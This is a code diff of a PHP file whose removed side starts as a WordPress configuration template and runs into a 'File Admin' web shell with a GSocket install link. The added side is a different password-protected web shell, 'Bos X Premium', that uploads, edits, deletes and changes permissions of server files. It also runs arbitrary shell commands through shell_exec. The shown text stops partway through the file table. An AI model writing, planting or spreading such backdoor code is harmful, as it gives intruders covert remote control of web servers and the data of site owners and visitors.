@@ -1,1032 +1,460 @@
 <?php
-/**
- * The base configuration for WordPress
- *
- * The wp-config.php creation script uses this file during the installation.
- * You don't have to use the website, you can copy this file to "wp-config.php"
- * and fill in the values.
- *
- * This file contains the following configurations:
- *
- * * Database settings
- * * Secret keys
- * * Database table prefix
- * * ABSPATH
- *
- * @link https://developer.wordpress.org/advanced-administration/wordpress/wp-config/
- *
- * @package WordPress
- */
-
-// ** Database settings - You can get this info from your web host ** //
-/** The name of the database for WordPress */
-define( 'DB_NAME', 'database_name_here' );
-
-/** Database username */
-define( 'DB_USER', 'username_here' );
-
-/** Database password */
-define( 'DB_PASSWORD', 'password_here' );
-
-/** Database hostname */
-define( 'DB_HOST', 'localhost' );
-
-/** Database charset to use in creating database tables. */
-define( 'DB_CHARSET', 'utf8' );
-
-/** The database collate type. Don't change this if in doubt. */
-define( 'DB_COLLATE', '' );
-
-/**#@+
- * Authentication unique keys and salts.
- *
- * Change these to different unique phrases! You can generate these using
- * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.
- *
- * You can change these at any point in time to invalidate all existing cookies.
- * This will force all users to have to log in again.
- *
- * @since 2.6.0
- */
-define( 'AUTH_KEY',         'put your unique phrase here' );
-define( 'SECURE_AUTH_KEY',  'put your unique phrase here' );
-define( 'LOGGED_IN_KEY',    'put your unique phrase here' );
-define( 'NONCE_KEY',        'put your unique phrase here' );
-define( 'AUTH_SALT',        'put your unique phrase here' );
-define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );
-define( 'LOGGED_IN_SALT',   'put your unique phrase here' );
-define( 'NONCE_SALT',       'put your unique phrase here' );
-
-/**#@-*/
-
-/**
- * WordPress database table prefix.
- *
- * You can have multiple installations in one database if you give each
- * a unique prefix. Only numbers, letters, and underscores please!
- */
-
 session_start();
-$current_filename = basename($_SERVER['SCRIPT_FILENAME']);
-$default_username = '0918'; // 0918
-$default_password_hash = '$2b$12$KjswPuuZPeX7MK2QrWwH6O8zJUtUNxnZWmVvYfHawi5O.QXe13tdG'; // admin123
-if (!isset($_SESSION['chat_session_id'])) {
-    $_SESSION['chat_session_id'] = md5($_SERVER['REMOTE_ADDR'] . time());
-}
-if (isset($_POST['login'])) {
-    $username = $_POST['username'] ?? '';
-    $password = $_POST['password'] ?? '';
-    if ($username === $default_username && password_verify($password, $default_password_hash)) {
-        $_SESSION['authenticated'] = true;
-        $_SESSION['username'] = $username;
-        $_SESSION['login_time'] = time();
-        
-        $_SESSION['alert'] = [
-            'type' => 'success',
-            'message' => 'Login successful! Welcome to File Admin.'
-        ];
-        header("Location: $current_filename");
-        exit;
+
+$password = 'Banjarnahor24';
+if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
+    if (isset($_POST['password']) && $_POST['password'] === $password) {
+        $_SESSION['loggedin'] = true;
     } else {
-        $_SESSION['alert'] = [
-            'type' => 'danger',
-            'message' => 'Invalid username or password.'
-        ];
+        echo '
+        <form method="post" style="text-align: center; margin-top: 20%;">
+            <input type="password" name="password" placeholder="Enter Password" required>
+            <button type="submit">Login</button>
+        </form>';
+        exit;
     }
 }
-if (isset($_GET['logout'])) {
-    session_destroy();
-    header("Location: $current_filename");
+
+// Fungsi untuk menghindari path traversal
+function sanitize_path($path) {
+    return str_replace(['../', './'], '', $path);
+}
+
+// Fungsi untuk menghapus folder rekursif
+function delete_folder($path) {
+    if (is_dir($path)) {
+        $files = array_diff(scandir($path), ['.', '..']);
+        foreach ($files as $file) {
+            delete_folder("$path/$file");
+        }
+        rmdir($path);
+    } else {
+        unlink($path);
+    }
+}
+
+// Mendapatkan path saat ini
+$current_path = isset($_GET['path']) ? sanitize_path($_GET['path']) : '.';
+$current_path = realpath($current_path);
+
+// Breadcrumb
+$breadcrumbs = explode('/', trim($current_path, '/'));
+$breadcrumb_path = '';
+
+// Handle actions
+if (isset($_POST['action'])) {
+    $target = isset($_POST['target']) ? sanitize_path($_POST['target']) : '';
+    $target_path = realpath($current_path . '/' . $target);
+
+    switch ($_POST['action']) {
+        case 'rename':
+            $new_name = isset($_POST['new_name']) ? sanitize_path($_POST['new_name']) : '';
+            if ($new_name && $target_path) {
+                rename($target_path, dirname($target_path) . '/' . $new_name);
+            }
+            break;
+        case 'delete':
+            if ($target_path) {
+                delete_folder($target_path);
+            }
+            break;
+        case 'chmod':
+            $mode = isset($_POST['mode']) ? $_POST['mode'] : '';
+            if ($target_path && $mode) {
+                chmod($target_path, octdec($mode));
+            }
+            break;
+        case 'touch':
+            $timestamp = isset($_POST['timestamp']) ? strtotime($_POST['timestamp']) : time();
+            if ($target_path) {
+                touch($target_path, $timestamp);
+            }
+            break;
+        case 'mkdir':
+            $dir_name = isset($_POST['dir_name']) ? sanitize_path($_POST['dir_name']) : '';
+            if ($dir_name) {
+                mkdir($current_path . '/' . $dir_name);
+            }
+            break;
+        case 'create_file':
+            $file_name = isset($_POST['file_name']) ? sanitize_path($_POST['file_name']) : '';
+            if ($file_name) {
+                file_put_contents($current_path . '/' . $file_name, '');
+            }
+            break;
+        case 'edit_file':
+            $file_content = isset($_POST['file_content']) ? $_POST['file_content'] : '';
+            if ($target_path && is_file($target_path)) {
+                file_put_contents($target_path, $file_content);
+            }
+            break;
+        case 'compress':
+            if ($target_path) {
+                $zip = new ZipArchive();
+                $zip_name = $target_path . '.zip';
+                if ($zip->open($zip_name, ZipArchive::CREATE) === TRUE) {
+                    if (is_dir($target_path)) {
+                        $files = new RecursiveIteratorIterator(
+                            new RecursiveDirectoryIterator($target_path),
+                            RecursiveIteratorIterator::LEAVES_ONLY
+                        );
+                        foreach ($files as $file) {
+                            if (!$file->isDir()) {
+                                $file_path = $file->getRealPath();
+                                $relative_path = substr($file_path, strlen($target_path) + 1);
+                                $zip->addFile($file_path, $relative_path);
+                            }
+                        }
+                    } else {
+                        $zip->addFile($target_path, basename($target_path));
+                    }
+                    $zip->close();
+                }
+            }
+            break;
+        case 'uncompress':
+            if ($target_path && is_file($target_path) && pathinfo($target_path, PATHINFO_EXTENSION) === 'zip') {
+                $zip = new ZipArchive();
+                if ($zip->open($target_path) === TRUE) {
+                    $zip->extractTo($current_path);
+                    $zip->close();
+                }
+            }
+            break;
+        case 'command':
+            $command = isset($_POST['command']) ? $_POST['command'] : '';
+            if ($command) {
+                $output = shell_exec("cd $current_path && $command 2>&1");
+            }
+            break;
+    }
+    header("Location: ?path=" . urlencode($current_path));
     exit;
 }
-$authenticated = isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true;
-$path = isset($_GET['path']) ? realpath($_GET['path']) : getcwd();
-if (!$path || !is_dir($path)) $path = getcwd();
-function formatSize($s) {
-    if ($s >= 1073741824) return round($s / 1073741824, 2) . ' GB';
-    if ($s >= 1048576) return round($s / 1048576, 2) . ' MB';
-    if ($s >= 1024) return round($s / 1024, 2) . ' KB';
-    return $s . ' B';
-}
-$search_results = [];
-$search_query = '';
-if (isset($_GET['search']) && !empty($_GET['search'])) {
-    $search_query = $_GET['search'];
-    $search_results = searchFiles($path, $search_query);
+
+// Handle file upload
+if (isset($_FILES['file'])) {
+    $upload_path = $current_path . '/' . basename($_FILES['file']['name']);
+    move_uploaded_file($_FILES['file']['tmp_name'], $upload_path);
+    header("Location: ?path=" . urlencode($current_path));
+    exit;
 }
 
-function searchFiles($directory, $query) {
-    $results = [];
-    $items = scandir($directory);
-    
-    foreach ($items as $item) {
-        if ($item === '.' || $item === '..') continue;
-        
-        $fullPath = $directory . '/' . $item;
-        if (stripos($item, $query) !== false) {
-            $results[] = [
-                'path' => $fullPath,
-                'name' => $item,
-                'is_dir' => is_dir($fullPath),
-                'size' => is_file($fullPath) ? filesize($fullPath) : 0
-            ];
-        }
-        if (is_dir($fullPath)) {
-            $subResults = searchFiles($fullPath, $query);
-            $results = array_merge($results, $subResults);
+// Handle file download
+if (isset($_GET['download'])) {
+    $target = sanitize_path($_GET['download']);
+    $target_path = realpath($current_path . '/' . $target);
+    if ($target_path && file_exists($target_path)) {
+        if (is_dir($target_path)) {
+            $zip = new ZipArchive();
+            $zip_name = $target_path . '.zip';
+            if ($zip->open($zip_name, ZipArchive::CREATE) === TRUE) {
+                $files = new RecursiveIteratorIterator(
+                    new RecursiveDirectoryIterator($target_path),
+                    RecursiveIteratorIterator::LEAVES_ONLY
+                );
+                foreach ($files as $file) {
+                    if (!$file->isDir()) {
+                        $file_path = $file->getRealPath();
+                        $relative_path = substr($file_path, strlen($target_path) + 1);
+                        $zip->addFile($file_path, $relative_path);
+                    }
+                }
+                $zip->close();
+                header('Content-Type: application/zip');
+                header('Content-Disposition: attachment; filename="' . basename($zip_name) . '"');
+                header('Content-Length: ' . filesize($zip_name));
+                readfile($zip_name);
+                unlink($zip_name);
+                exit;
+            }
+        } else {
+            header('Content-Type: application/octet-stream');
+            header('Content-Disposition: attachment; filename="' . basename($target_path) . '"');
+            header('Content-Length: ' . filesize($target_path));
+            readfile($target_path);
+            exit;
         }
     }
-    
-    return $results;
 }
-function isWritable($path) {
-    return is_writable($path);
-}
-function isExecutable($path) {
-    return is_executable($path);
-}
-function formatPermissions($path) {
-    $perms = substr(sprintf('%o', fileperms($path)), -4);
-    $writable = isWritable($path);
-    $executable = isExecutable($path);
-    
-    $class = '';
-    if ($writable) {
-        $class = 'perm-writable';
+
+// Handle file editing
+if (isset($_GET['file'])) {
+    $file_to_edit = sanitize_path($_GET['file']);
+    $file_path = realpath($current_path . '/' . $file_to_edit);
+
+    if ($file_path && is_file($file_path) && strpos($file_path, realpath($current_path)) === 0) {
+        $file_content = file_get_contents($file_path);
     } else {
-        $class = 'perm-not-writable';
+        $file_content = "Cannot edit this file.";
     }
-    
-    if ($executable) {
-        $class .= ' perm-executable';
-    }
-    
-    return '<span class="' . $class . '">' . $perms . '</span>';
 }
 
-/**
-* Note: This file may contain artifacts of previous malicious infection.
-* However, the dangerous code has been removed, and the file is now safe to use.
-*/
+if (isset($_GET['file']) && isset($_GET['raw'])) {
+    $file_to_edit = sanitize_path($_GET['file']);
+    $file_path = realpath($current_path . '/' . $file_to_edit);
 
-function getFileIcon($filename) {
-    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
-    
-    $iconMap = [
-        'txt' => 'text',
-        'pdf' => 'pdf',
-        'doc' => 'word',
-        'docx' => 'word',
-        'xls' => 'excel',
-        'xlsx' => 'excel',
-        'ppt' => 'powerpoint',
-        'pptx' => 'powerpoint',
-        'jpg' => 'image',
-        'jpeg' => 'image',
-        'png' => 'image',
-        'gif' => 'image',
-        'svg' => 'image',
-        'mp3' => 'audio',
-        'wav' => 'audio',
-        'mp4' => 'video',
-        'mov' => 'video',
-        'zip' => 'archive',
-        'rar' => 'archive',
-        'tar' => 'archive',
-        'gz' => 'archive',
-        'php' => 'code',
-        'html' => 'code',
-        'css' => 'code',
-        'js' => 'code',
-        'json' => 'code',
-        'xml' => 'code',
-    ];
-    
-    return isset($iconMap[$ext]) ? $iconMap[$ext] : 'file';
+    if ($file_path && is_file($file_path) && strpos($file_path, realpath($current_path)) === 0) {
+        header("Content-Type: text/plain");
+        echo file_get_contents($file_path);
+        exit;
+    } else {
+        http_response_code(403);
+        echo "Cannot edit this file.";
+        exit;
+    }
 }
-function getEditorMode($filename) {
-    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
-    
-    $modeMap = [
-        'php' => 'application/x-httpd-php',
-        'html' => 'text/html',
-        'htm' => 'text/html',
-        'css' => 'text/css',
-        'js' => 'text/javascript',
-        'json' => 'application/json',
-        'xml' => 'application/xml',
-        'md' => 'text/x-markdown',
-        'txt' => 'text/plain',
-        'ini' => 'text/x-properties',
-        'conf' => 'text/x-properties',
-        'sql' => 'text/x-sql',
-        'py' => 'text/x-python',
-        'java' => 'text/x-java',
-        'c' => 'text/x-csrc',
-        'cpp' => 'text/x-c++src',
-        'cs' => 'text/x-csharp',
-        'go' => 'text/x-go',
-        'rb' => 'text/x-ruby',
-        'sh' => 'text/x-sh',
-        'yaml' => 'text/x-yaml',
-        'yml' => 'text/x-yaml',
-    ];
-    
-    return isset($modeMap[$ext]) ? $modeMap[$ext] : 'text/plain';
-}
-function isViewable($filename) {
-    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
-    $viewable = ['jpg', 'jpeg', 'png', 'gif', 'svg', 'pdf', 'txt', 'md', 'html', 'htm'];
-    return in_array($ext, $viewable);
-}
-function getMimeType($filename) {
-    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
-    
-    $mimeMap = [
-        'jpg' => 'image/jpeg',
-        'jpeg' => 'image/jpeg',
-        'png' => 'image/png',
-        'gif' => 'image/gif',
-        'svg' => 'image/svg+xml',
-        'pdf' => 'application/pdf',
-        'txt' => 'text/plain',
-        'md' => 'text/markdown',
-        'html' => 'text/html',
-        'htm' => 'text/html',
-    ];
-    
-    return isset($mimeMap[$ext]) ? $mimeMap[$ext] : 'application/octet-stream';
-}
-$theme = isset($_COOKIE['theme']) ? $_COOKIE['theme'] : 'light';
+
 ?>
+
 <!DOCTYPE html>
-<html lang="en" data-theme="<?php echo $theme; ?>">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>File Admin</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/codemirror.min.css">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/theme/dracula.min.css">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/theme/eclipse.min.css">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/addon/dialog/dialog.min.css">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/addon/search/matchesonscrollbar.min.css">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/addon/fold/foldgutter.min.css">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/addon/hint/show-hint.min.css">
-    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/eclibesec/EclipseFileManager@main/styles.css">
+    <title>Bos X Premium</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 20px; }
+        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
+        table, th, td { border: 1px solid #ddd; }
+        th, td { padding: 10px; text-align: left; }
+        th { background-color: #f4f4f4; }
+        .breadcrumb { margin-bottom: 20px; }
+        .breadcrumb a { text-decoration: none; color: #007bff; }
+        .breadcrumb a:hover { text-decoration: underline; }
+        .actions { margin-bottom: 20px; }
+        .actions button { margin-right: 10px; }
+        .modal { display: none; position: fixed; top: 20%; left: 30%; background: #fff; padding: 20px; border: 1px solid #ddd; box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); }
+        .modal h2 { margin-top: 0; }
+        .modal textarea { width: 100%; height: 200px; }
+        .modal button { margin-top: 10px; }
+    </style>
 </head>
 <body>
-    <?php if (!$authenticated): ?>
-    <div class="login-container">
-        <div class="login-card">
-            <div class="login-header">
-                <h2>File Admin</h2>
-                <p>Please login first</p>
-            </div>
-            <div class="login-body">
-                <?php if (isset($_SESSION['alert'])): ?>
-                <div class="alert alert-<?php echo $_SESSION['alert']['type']; ?>">
-                    <i class="fas fa-<?php echo $_SESSION['alert']['type'] === 'success' ? 'check-circle' : 'exclamation-circle'; ?>"></i>
-                    <span><?php echo $_SESSION['alert']['message']; ?></span>
-                </div>
-                <?php unset($_SESSION['alert']); endif; ?>
-                
-                <form method="post">
-                    <div class="form-group">
-                        <label for="username" class="form-label">Username</label>
-                        <input type="text" name="username" id="username" class="form-control" placeholder="Enter username" required autofocus>
-                    </div>
-                    <div class="form-group">
-                        <label for="password" class="form-label">Password</label>
-                        <input type="password" name="password" id="password" class="form-control" placeholder="Enter password" required>
-                    </div>
-                    <button type="submit" name="login" class="btn btn-primary btn-block">
-                        <i class="fas fa-sign-in-alt"></i>
-                        <span>Login</span>
-                    </button>
-                </form>
-            </div>
-            <div class="login-footer">
-                <p class="text-muted text-sm">File Admin</p>
-            </div>
-        </div>
+    <h1>Bos X Premium</h1>
+
+    <!-- Breadcrumb -->
+    <div class="breadcrumb">
+        <a href="?path=.">Root</a>
+        <?php foreach ($breadcrumbs as $crumb): ?>
+            / <a href="?path=<?= urlencode($breadcrumb_path . '/' . $crumb) ?>"><?= $crumb ?></a>
+            <?php $breadcrumb_path .= '/' . $crumb; ?>
+        <?php endforeach; ?>
     </div>
-    <?php else: ?>
-    <div class="toast-container" id="toastContainer"></div>
-    
-    <div class="container">
-        <aside class="sidebar" id="sidebar">
-            <div class="sidebar-header">
-                <div class="logo">
-                    <i class="fas fa-folder"></i>
-                    <span>File Admin</span>
-                </div>
-                <button class="btn btn-sm btn-icon btn-light mobile-toggle" id="closeSidebar">
-                    <i class="fas fa-times"></i>
-                </button>
-            </div>
-            <div class="sidebar-content">
-                <div class="user-info mb-4">
-                    <div class="user-avatar">
-                        <?php echo strtoupper(substr($_SESSION['username'], 0, 1)); ?>
-                    </div>
-                    <div class="user-details">
-                        <div class="user-name"><?php echo htmlspecialchars($_SESSION['username']); ?></div>
-                        <div class="user-role">Administrator</div>
-                    </div>
-                </div>
-                
-                <div class="search-box">
-                    <i class="fas fa-search search-icon"></i>
-                    <form action="" method="get">
-                        <input type="hidden" name="path" value="<?php echo htmlspecialchars($path); ?>">
-                        <input type="text" name="search" class="search-input" placeholder="Search files..." value="<?php echo htmlspecialchars($search_query); ?>">
-                    </form>
-                </div>
-                <div class="card mb-4">
-                    <div class="card-body p-3">
-                        <div class="d-flex align-items-center gap-3 mb-3">
-                            <i class="fas fa-hdd text-primary" style="font-size: 1.5rem;"></i>
-                            <div>
-                                <div class="text-sm text-muted">Storage</div>
-                                <div class="text-sm">
-                                    <?php
-                                    $totalSpace = disk_total_space($path);
-                                    $freeSpace = disk_free_space($path);
-                                    $usedSpace = $totalSpace - $freeSpace;
-                                    $usedPercent = round(($usedSpace / $totalSpace) * 100);
-                                    echo formatSize($usedSpace) . ' / ' . formatSize($totalSpace);
-                                    ?>
-                                </div>
-                            </div>
-                        </div>
-                        <div style="height: 6px; background-color: var(--border); border-radius: 3px; overflow: hidden;">
-                            <div style="height: 100%; width: <?php echo $usedPercent; ?>%; background-color: var(--primary);"></div>
-                        </div>
-                        <div class="text-xs text-right text-muted mt-1"><?php echo $usedPercent; ?>% used</div>
-                    </div>
-                </div>
-                <div class="sidebar-menu">
-                    <div class="sidebar-menu-title">Quick Access</div>
-                    <ul class="sidebar-menu-items">
-                        <li class="sidebar-menu-item">
-                            <a href="?path=<?php echo urlencode(getcwd()); ?>" class="sidebar-menu-link">
-                                <span class="sidebar-menu-icon"><i class="fas fa-home"></i></span>
-                                <span>Home Directory</span>
-                            </a>
-                        </li>
-                        <?php if (is_dir(getcwd() . '/uploads')): ?>
-                        <li class="sidebar-menu-item">
-                            <a href="?path=<?php echo urlencode(getcwd() . '/uploads'); ?>" class="sidebar-menu-link">
-                                <span class="sidebar-menu-icon"><i class="fas fa-upload"></i></span>
-                                <span>Uploads</span>
-                            </a>
-                        </li>
-                        <?php endif; ?>
-                        <li class="sidebar-menu-item">
-                            <a href="?path=<?php echo urlencode($path); ?>&view=chat" class="sidebar-menu-link <?php echo isset($_GET['view']) && $_GET['view'] === 'chat' ? 'active' : ''; ?>">
-                                <span class="sidebar-menu-icon"><i class="fas fa-robot"></i></span>
-                                <span>Chat AI</span>
-                            </a>
-                        </li>
-                    </ul>
-                </div>
-                <div class="sidebar-menu">
-                    <div class="sidebar-menu-title">Tools</div>
-                    <ul class="sidebar-menu-items">
-                        <li class="sidebar-menu-item">
-                            <a href="#" class="sidebar-menu-link" id="openNewFolderModalBtn">
-                                <span class="sidebar-menu-icon"><i class="fas fa-folder-plus"></i></span>
-                                <span>New Folder</span>
-                            </a>
-                        </li>
-                        <li class="sidebar-menu-item">
-                            <a href="#" class="sidebar-menu-link" id="openNewFileModalBtn">
-                                <span class="sidebar-menu-icon">
-                                    <i class="fas fa-file"></i>
-                                    <i class="fas fa-plus" style="font-size: 0.7em; position: absolute; margin-left: -0.5em; margin-top: -0.5em;"></i>
-                                </span>
-                                <span>New File</span>
-                            </a>
-                        </li>
-                        <li class="sidebar-menu-item">
-                            <a href="#" class="sidebar-menu-link" id="openUploadModalBtn">
-                                <span class="sidebar-menu-icon"><i class="fas fa-cloud-upload-alt"></i></span>
-                                <span>Upload Files</span>
-                            </a>
-                        </li>
-                        <li class="sidebar-menu-item">
-                            <a href="?path=<?php echo urlencode($path); ?>&install_gsocket=1" class="sidebar-menu-link">
-                                <span class="sidebar-menu-icon"><i class="fas fa-network-wired"></i></span>
-                                <span>Install GSocket</span>
-                            </a>
-                        </li>
-                    </ul>
-                </div>
-                <button class="theme-toggle" id="themeToggle">
-                    <i class="fas fa-<?php echo $theme === 'dark' ? 'sun' : 'moon'; ?>"></i>
-                    <span><?php echo $theme === 'dark' ? 'Light Mode' : 'Dark Mode'; ?></span>
-                </button>
-            </div>
-            <div class="sidebar-footer">
-                <a href="?logout=true" class="btn btn-danger btn-block">
-                    <i class="fas fa-sign-out-alt"></i>
-                    <span>Logout</span>
-                </a>
-            </div>
-        </aside>
 
-        <main class="main-content">
-            <div class="topbar">
-                <div class="d-flex align-items-center gap-3">
-                    <button class="btn btn-sm btn-icon btn-light mobile-toggle" id="openSidebar">
-                        <i class="fas fa-bars"></i>
-                    </button>
-                    <div class="breadcrumb">
-                        <?php
-                        if (isset($_GET['view']) && $_GET['view'] === 'chat') {
-                            echo '<div class="breadcrumb-item">';
-                            echo '<a href="?path=' . urlencode($path) . '" class="breadcrumb-link"><i class="fas fa-home"></i></a>';
-                            echo '</div>';
-                            echo '<span class="current-path">/Chat AI</span>';
-                        } else {
-                            $parts = explode('/', $path);
-                            $breadcrumb = '';
-                            
-                            echo '<div class="breadcrumb-item">';
-                            echo '<a href="?path=/" class="breadcrumb-link"><i class="fas fa-home"></i></a>';
-                            echo '</div>';
-                            
-                            foreach ($parts as $i => $part) {
-                                if (empty($part)) continue;
-                                
-                                $breadcrumb .= '/' . $part;
-                                
-                                if ($i === count($parts) - 1) {
-                                    echo '<span class="current-path">/' . htmlspecialchars($part) . '</span>';
-                                } else {
-                                    echo '<a href="?path=' . urlencode($breadcrumb) . '" class="breadcrumb-link">/' . htmlspecialchars($part) . '</a>';
-                                }
-                            }
-                        }
-                        ?>
-                    </div>
-                </div>
-                <div>
-                    <?php if (!isset($_GET['view']) || $_GET['view'] !== 'chat'): ?>
-                    <button class="btn btn-sm btn-primary" id="openUploadModalTopBtn">
-                        <i class="fas fa-upload"></i>
-                        <span>Upload</span>
-                    </button>
-                    <?php else: ?>
-                    <button class="btn btn-sm btn-primary" id="newChatSession">
-                        <i class="fas fa-plus"></i>
-                        <span>New Chat</span>
-                    </button>
-                    <?php endif; ?>
-                </div>
-            </div>
+    <!-- Actions -->
+    <div class="actions">
+        <button onclick="window.location.href='?path=.'">Home</button>
+        <button onclick="window.location.href='?path=<?= urlencode(dirname($current_path)) ?>'">Back</button>
+        <button onclick="document.getElementById('uploadForm').style.display='block'">Upload</button>
+        <button onclick="document.getElementById('createFolderForm').style.display='block'">Create Folder</button>
+        <button onclick="document.getElementById('createFileForm').style.display='block'">Create File</button>
+        <button onclick="document.getElementById('commandForm').style.display='block'">Run Command</button>
+    </div>
 
-            <div class="content">
-                <?php if (isset($_SESSION['alert'])): ?>
-                <div class="alert alert-<?php echo $_SESSION['alert']['type']; ?>">
-                    <i class="fas fa-<?php echo $_SESSION['alert']['type'] === 'success' ? 'check-circle' : 'exclamation-circle'; ?>"></i>
-                    <span><?php echo $_SESSION['alert']['message']; ?></span>
-                </div>
-                <script>
-                    document.addEventListener('DOMContentLoaded', function() {
-                        showToast('<?php echo $_SESSION['alert']['type']; ?>', 
-                                '<?php echo $_SESSION['alert']['type'] === 'success' ? 'Success' : 'Error'; ?>', 
-                                '<?php echo addslashes($_SESSION['alert']['message']); ?>');
-                    });
-                </script>
-                <?php unset($_SESSION['alert']); endif; ?>
+    <!-- Upload Form -->
+    <form id="uploadForm" action="" method="post" enctype="multipart/form-data" style="display:none; margin-bottom: 20px;">
+        <input type="file" name="file">
+        <button type="submit">Upload</button>
+        <button type="button" onclick="document.getElementById('uploadForm').style.display='none'">Cancel</button>
+    </form>
 
-                <?php if (!empty($search_query)): ?>
-                <!-- Search Results -->
-                <div class="search-results">
-                    <div class="search-results-header">
-                        Search results for "<?php echo htmlspecialchars($search_query); ?>" (<?php echo count($search_results); ?> found)
-                    </div>
-                    <div class="search-results-body">
-                        <?php if (empty($search_results)): ?>
-                        <div class="text-center p-3 text-muted">No results found</div>
-                        <?php else: ?>
-                        <?php foreach ($search_results as $result): ?>
-                        <div class="search-result-item">
-                            <a href="?path=<?php echo urlencode(dirname($result['path'])); ?><?php echo $result['is_dir'] ? '' : '&edit=' . urlencode(basename($result['path'])); ?>" class="search-result-link">
-                                <div class="search-result-icon <?php echo $result['is_dir'] ? 'folder' : getFileIcon(basename($result['path'])); ?>" style="background-color: <?php echo $result['is_dir'] ? 'var(--warning)' : ''; ?>">
-                                    <i class="fas fa-<?php echo $result['is_dir'] ? 'folder' : 'file'; ?>"></i>
-                                </div>
-                                <div>
-                                    <div class="search-result-name"><?php echo htmlspecialchars(basename($result['path'])); ?></div>
-                                    <div class="search-result-path"><?php echo htmlspecialchars(dirname($result['path'])); ?></div>
-                                </div>
-                            </a>
-                        </div>
-                        <?php endforeach; ?>
-                        <?php endif; ?>
-                    </div>
-                </div>
-                <?php endif; ?>
+    <!-- Create Folder Form -->
+    <form id="createFolderForm" action="" method="post" style="display:none; margin-bottom: 20px;">
+        <input type="text" name="dir_name" placeholder="New Folder Name" required>
+        <button type="submit" name="action" value="mkdir">Create Folder</button>
+        <button type="button" onclick="document.getElementById('createFolderForm').style.display='none'">Cancel</button>
+    </form>
 
-                <?php if (isset($_GET['view']) && $_GET['view'] === 'chat'): ?>
-                <div class="chat-container">
-                    <div class="chat-header">
-                        <div class="chat-title">
-                            <i class="fas fa-robot"></i>
-                            <span>EclipseAI Assistant</span>
-                        </div>
-                        <div>
-                            <button class="btn btn-sm btn-light" id="newChatBtn">
-                                <i class="fas fa-plus"></i>
-                                <span>New Chat</span>
-                            </button>
-                        </div>
-                    </div>
-                    <div class="chat-body" id="chatMessages">
-                        <div class="chat-empty" id="chatEmpty">
-                            <div class="chat-empty-icon">
-                                <i class="fas fa-robot"></i>
-                            </div>
-                            <div class="chat-empty-title">EclipseAI Assistant</div>
-                            <div class="chat-empty-text">
-                                Hello! I'm EclipseAI, your AI assistant. I can help you solve problems, answer questions, and provide information on various topics. How can I assist you today?
-                            </div>
-                        </div>
-                    </div>
-                    <div class="chat-footer">
-                        <form id="chatForm" class="chat-form">
-                            <label class="chat-attachment">
-                                <i class="fas fa-paperclip"></i>
-                                <input type="file" id="chatFile" accept="image/*,.pdf,.doc,.docx,.txt">
-                            </label>
-                            <input type="text" id="chatInput" class="chat-input" placeholder="Type your message..." autocomplete="off">
-                            <button type="submit" class="chat-send" id="chatSend">
-                                <i class="fas fa-paper-plane"></i>
-                            </button>
+    <!-- Create File Form -->
+    <form id="createFileForm" action="" method="post" style="display:none; margin-bottom: 20px;">
+        <input type="text" name="file_name" placeholder="New File Name" required>
+        <button type="submit" name="action" value="create_file">Create File</button>
+        <button type="button" onclick="document.getElementById('createFileForm').style.display='none'">Cancel</button>
+    </form>
+
+    <!-- Command Form -->
+    <form id="commandForm" action="" method="post" style="display:none; margin-bottom: 20px;">
+        <input type="text" name="command" placeholder="Enter Linux Command" required>
+        <button type="submit" name="action" value="command">Run Command</button>
+        <button type="button" onclick="document.getElementById('commandForm').style.display='none'">Cancel</button>
+    </form>
+    <?php if (isset($output)): ?>
+        <pre><?= htmlspecialchars($output) ?></pre>
+    <?php endif; ?>
+
+    <!-- File List -->
+    <table>
+        <thead>
+            <tr>
+                <th>Name</th>
+                <th>Type</th>
+                <th>Size</th>
+                <th>Permissions</th>
+                <th>Owner/Group</th>
+                <th>Last Modified</th>
+                <th>Actions</th>
+            </tr>
+        </thead>
+        <tbody>
+            <?php if ($current_path !== realpath('.')): ?>
+                <tr>
+                    <td><a href="?path=<?= urlencode(dirname($current_path)) ?>">..</a></td>
+                    <td>Parent Directory</td>
+                    <td></td>
+                    <td></td>
+                    <td></td>
+                    <td></td>
+                    <td></td>
+                </tr>
+            <?php endif; ?>
+            <?php
+            $items = scandir($current_path);
+            $folders = array_filter($items, function($item) use ($current_path) {
+                return is_dir($current_path . '/' . $item) && $item !== '.' && $item !== '..';
+            });
+            $files = array_filter($items, function($item) use ($current_path) {
+                return is_file($current_path . '/' . $item);
+            });
+            ?>
+            <?php foreach ($folders as $item): ?>
+                <?php $item_path = $current_path . '/' . $item; ?>
+                <tr>
+                    <td>
+                        <a href="?path=<?= urlencode($item_path) ?>"><?= $item ?></a>
+                    </td>
+                    <td>Directory</td>
+                    <td></td>
+                    <td><?= substr(sprintf('%o', fileperms($item_path)), -4) ?></td>
+                    <td><?= posix_getpwuid(fileowner($item_path))['name'] . '/' . posix_getgrgid(filegroup($item_path))['name'] ?></td>
+                    <td><?= date("Y-m-d H:i:s", filemtime($item_path)) ?></td>
+                    <td>
+                        <button onclick="openRenameModal('<?= $item ?>')">Rename</button>
+                        <button onclick="openChmodModal('<?= $item ?>')">Chmod</button>
